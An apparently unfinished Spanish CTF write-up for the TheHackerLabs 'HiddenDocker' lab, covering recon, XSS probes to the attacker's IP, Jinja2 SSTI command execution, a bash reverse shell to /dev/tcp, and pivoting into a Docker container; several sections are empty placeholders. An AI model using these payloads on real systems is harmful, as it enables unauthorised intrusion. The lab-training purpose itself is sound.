---
layout: single
title: HiddenDocker - TheHackerLabs
excerpt: "."
date: 2025-06-20
classes: wide
header:
  teaser: /assets/images/THL-writeup-hiddenDocker/hiddenDocker.jpg
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-hiddenDocker/hiddenDocker.jpg)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Puerto5k">Analizando Página Web de Puerto 5000</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#XSS">Identificando Campos Vulnerables a XSS</a></li>
				<li><a href="#SSTI">Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#linEnum">Enumeración de la Máquina Víctima</a></li>
				<li><a href="#contenedor">Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker</a></li>
				<ul>
					<li><a href="#portForwarding">Aplicando Port Forwarding para Ver Página Web de Contenedor Docker</a></li>
					<li><a href="#Tunneling">Aplicando Tunneling para Alcanzar Contenedor de Docker</a></li>
				</ul>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.130
PING 192.168.10.130 (192.168.10.130) 56(84) bytes of data.
64 bytes from 192.168.10.130: icmp_seq=1 ttl=64 time=5.27 ms
64 bytes from 192.168.10.130: icmp_seq=2 ttl=64 time=0.949 ms
64 bytes from 192.168.10.130: icmp_seq=3 ttl=64 time=0.797 ms
64 bytes from 192.168.10.130: icmp_seq=4 ttl=64 time=0.663 ms

--- 192.168.10.130 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3265ms
rtt min/avg/max/mdev = 0.663/1.920/5.274/1.938 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:28 CST
Initiating ARP Ping Scan at 12:28
Scanning 192.168.10.130 [1 port]
Completed ARP Ping Scan at 12:28, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:28
Scanning 192.168.10.130 [65535 ports]
Discovered open port 22/tcp on 192.168.10.130
Discovered open port 5000/tcp on 192.168.10.130
Completed SYN Stealth Scan at 12:28, 11.26s elapsed (65535 total ports)
Nmap scan report for 192.168.10.130
Host is up, received arp-response (0.0014s latency).
Scanned at 2025-06-20 12:28:28 CST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay dos puertos abiertos y me da curiosidad saber que servicios ejecuta el **puerto 5000**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,5000 192.168.10.130 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:29 CST
Nmap scan report for 192.168.10.130
Host is up (0.00089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 50:80:8f:01:a0:d4:76:f4:08:95:df:a1:45:39:71:93 (ECDSA)
|_  256 e8:af:26:05:75:f8:3e:d0:bf:d7:42:a1:42:48:fc:e6 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Flask Lab
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, podemos ver que hay una página web en el **puerto 5000** y que esta ocupando **Werkzeug** y al parecer también **Flask**.

Ya conocemos una vulnerabilidad común que ocurre cuando se ocupan estos dos.

Pero primero, vamos a analizar esa página web.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Puerto5k">Analizando Página Web de Puerto 5000</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura1.png">
</p>

Parece ser un formulario de registro.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura2.png">
</p>

No veo algo que nos ayude.

Revisemos el código fuente para ver como funciona el formulario:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura3.png">
</p>

Por lo que entiendo, el formulario manda por una **petición POST** los campos del formulario que introduzcamos, una vez enviados, nos redirige a la página `/greet`.

Pero parece que el campo del email no podremos modificarlo:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura4.png">
</p>

Todo esto lo podemos comprobar si capturamos el envio de la petición con **BurpSuite**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura5.png">
</p>

Ahí podemos ver la data como se esta enviando.

Y cuando se envia, nos manda a la página `/greet`:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura6.png">
</p>

Algo que note en el código fuente, es que parece todos los campos, a excepción del campo email, aceptan cualquier texto, pues parece que no se esta aplicando alguna sanitización. Además, el campo **name**, es el único que se refleja en la página `/greet`.

Esto nos da una idea de lo que podemos probar primero.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="XSS">Identificando Campos Vulnerables a XSS</h2>

Para el caso de los formularios, podemos probar cual de estos es vulnerable a XSS.

La idea es, probar varios **payloads XSS** que tengan como objetivo cargar un archivo de un servidor que tenga el nombre del campo que estamos probando.

El servidor será nuestro y no importa que dicho archivo exista, pues es simplemente para identificar el campo vulnerable.

Algunos ejemplos pueden ser:
```bash
<script src=http://Tu_IP/nombre_campo></script>

'><script src=http://Tu_IP/nombre_campo></script>

"><script src=http://Tu_IP/nombre_campo></script>
```

Utilizaremos el primero y usaremos un servidor de **PHP**, para ver mejor la petición, aunque también se puede con un servidor de **Python**.

Inicia el servidor de **PHP**:
```bash
php -S 0.0.0.0:80
[Fri Jun 20 14:10:27 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
```

Ahora, vamos a probar desde la página el payload de XSS. 

Recuerda escribir el nombre del campo al que se dirigira el payload, para identificar que campo es vulnerable:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura7.png">
</p>

Al enviarlo, vemos que un campo si es vulnerable:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura8.png">
</p>

Y si revisamos el servidor de **PHP**, veremos cual es:
```bash
php -S 0.0.0.0:80
[Fri Jun 20 13:45:47 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 Accepted
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 [404]: GET /name - No such file or directory
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 Closing
```
En efecto, el campo **name** es vulnerable a **XSS**.

Esto también lo podemos probar desde **BurpSuite**, modificando la data para incluir el payload de **XSS**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura9.png">
</p>

De paso probamos el campo del email, pero esta claro que ese no será vulnerable, pues ya esta llenado por defecto y no se puede modificar. Además, vemos el servidor **Werkzeug** referenciado en la respuesta de la petición.

Con esto comprobamos que:
* No hay una sanitización en ningún campo, siendo el campo **name** vulnerable a **XSS**.
* El campo **name**, es el único que se representa en la página `/greet`, después de que se envía la data.
* El uso del servidor **Werkzeug** y de que **Flask** también puede estar en uso, significa que puede ser vulnerable a **Server Side Template Injection** a traves del campo **name**.

Vamos a comprobarlo.

<br>

<h2 id="SSTI">Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina</h2>

Tenemos como referencia el siguiente blog y repositorio que nos explican como aplicar el **SSTI**:
* <a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank">Flask Jinja2 Pentesting</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: Jinja2</a>

Veamos si reproduce la siguiente multiplicación:

{% raw %}
```bash
{{ 10*50 }}
```
{% endraw %}

Recuerda probarla en el campo **name**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura10.png">
</p>

Funcionó.

Entonces, vamos a probar si ejecuta el comando **id** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

Probemoslo:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura11.png">
</p>

Excelente, si lo esta ejecutando.

Directamente, utilicemos una **Reverse Shell** de **Bash**.

Inicia un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Ahora, ejecutamos la **Reverse Shell** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'").read() }}
```
{% endraw %}

Una vez que la ejecutes en la página web, observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.130] 49248
bash: no se puede establecer el grupo de proceso de terminal (334): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
pepinodemar@hiddendocker:~$ whoami
whoami
pepinodemar
```
Estamos dentro y nos encontramos en el directorio del **usuario pepinodemar**.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Continuemos.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="linEnum">Enumeración de la Máquina</h2>

Veamos qué archivos tiene este usuario:
```bash
pepinodemar@hiddendocker:~$ ls -la
total 32
drwx------ 4 pepinodemar pepinodemar 4096 may 23  2024 .
drwxr-xr-x 4 root        root        4096 may 22  2024 ..
lrwxrwxrwx 1 root        root           9 may 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pepinodemar pepinodemar  220 may 22  2024 .bash_logout
-rw-r--r-- 1 pepinodemar pepinodemar 3526 may 22  2024 .bashrc
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 23  2024 Desktop
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 22  2024 .local
-rw-r--r-- 1 pepinodemar pepinodemar  807 may 22  2024 .profile
-rw-r--r-- 1 pepinodemar pepinodemar   24 may 22  2024 user.txt
```

Podemos leer la flag del usuario:
```bash
pepinodemar@hiddendocker:~$ cat user.txt
...
```

Si revisamos el directorio **Desktop**, ahí encontraremos el directorio de **Flask**:
```bash
pepinodemar@hiddendocker:~$ ls -la Desktop/flaskapp/
total 16
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 22  2024 .
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 23  2024 ..
-rw-r--r-- 1 pepinodemar pepinodemar  472 may 22  2024 app.py
drwxr-xr-x 2 pepinodemar pepinodemar 4096 may 22  2024 templates
```

Y si revisamos ese script de **Python**, veremos que fue diseñado para ser vulnerable a **SSTI**:
```bash
pepinodemar@hiddendocker:~$ cat Desktop/flaskapp/app.py 
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/greet', methods=['POST'])
def greet():
    name = request.form['name']
    # Render the template with the user input directly (vulnerable a SSTI)
    template = f"Hello {name}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
```
De ahí en fuera, no encontraremos algo más.

Lo interesante, es que si revisamos que interfaces existen, veremos que esta **docker** instalado:
```bash
pepinodemar@hiddendocker:~$ ip a
...
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether nm:8f:0a:8q:c9:76 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:7cff:fe8c:298b/64 scope link 
       valid_lft forever preferred_lft forever
...
```
Normalmente, cuando se crea un contenedor y es el primero en crearse, se le asigna la IP `172.17.0.2` (a menos que se especifique una IP).

Comprobemoslo con **ping**:
```bash
pepinodemar@hiddendocker:~$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.035 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 0.035/0.042/0.050/0.007 ms
```

Bien, aun así, podemos aplicar un **ping sweep** con el siguiente oneliner de **Bash**:
```bash
pepinodemar@hiddendocker:~$ for i in $(seq 254); do ping 172.17.0.$i -c1 -W1 & done | grep from
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.031 ms
```
Excelente, tenemos identificado el contenedor.

Ahora, utiliza el siguiente oneliner de **Bash** que identifica los puertos abiertos:
```bash
pepinodemar@hiddendocker:~$ for port in {1..65535}; do echo > /dev/tcp/172.17.0.2/$port && echo "Port: $port open"; done 2>/dev/null
Port: 80 open
```
Tiene el **puerto 80** abierto, lo que significa que hay una página web activa.

Podriamos comprobarlo con **curl**, pero la máquina no lo tiene.

<br>

<h2 id="contenedor">Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker</h2>

Entonces, tenemos dos opciones:
* Aplicar **Port Forwarding** para poder ver la página del contenedor.
* Aplicar **Tunneling** para poder ver alcanzar al contenedor y utilizar distintas herramientas sobre este.

Apliquemos ambas.

<br>

<h3 id="portForwarding">Aplicando Port Forwarding para Ver Página Web de Contenedor Docker</h3>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h3 id="Tunneling">Aplicando Tunneling para Alcanzar Contenedor de Docker</h3>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id="PaginaDocker">Analizando Página Web de Contenedor de Docker</h2>

```bash
proxychains nmap -sT -Pn -n -p1-100 172.17.0.2
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 16:33 CST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:80  ...  OK
...
Nmap scan report for 172.17.0.2
Host is up (0.013s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

```bash
proxychains gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300 -x txt,html,php --proxy socks5://127.0.0.1:1080
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 8235]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882180 / 882184 (100.00%)
===============================================================
Finished
===============================================================
```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```




<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
